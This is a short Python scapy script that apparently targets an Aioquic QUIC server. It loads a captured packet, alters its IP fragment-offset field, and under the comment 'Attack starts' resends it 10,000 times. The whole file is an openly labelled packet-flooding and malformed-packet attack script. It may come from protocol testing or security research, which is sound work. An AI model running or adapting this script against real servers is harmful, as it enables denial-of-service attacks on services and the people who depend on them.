# Server : Aioquic
# Link : https://pgjones.dev/

from scapy.all import *

packetCollection = rdpcap("packet.pcapng")
packet = packetCollection[0]

# Changes applied

packet[IP].frag = 1     # Changed frag flag 

packet.show()

# Attack starts

cnt=1

while cnt <= 10000:
    sendp(packet)
    cnt = cnt + 1
